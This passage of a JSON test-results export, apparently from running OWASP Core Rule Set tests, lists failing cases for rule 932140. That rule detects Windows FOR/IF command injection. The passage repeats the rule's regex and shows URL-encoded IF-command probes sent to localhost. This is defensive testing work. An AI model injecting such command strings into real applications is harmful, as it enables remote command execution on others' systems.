          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 120,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942310 - Detects chained SQL injection attempts 2/2", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 120,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22%25VAR%25%22+%3D%3D+%22before%22+%28",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 121,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 121,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22%25VAR%25%22+%3D%3D+%22after%22+%40echo+ok",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 122,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942190 - Detects MSSQL code execution and information gathering attempts", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 122,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22%21VAR%21%22+%3D%3D+%22after%22+%40echo+ok",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 123,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 123,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+not+defined+BAR+set+FOO%3D1%26+echo+FOO%3A+%25FOO%25",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 124,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
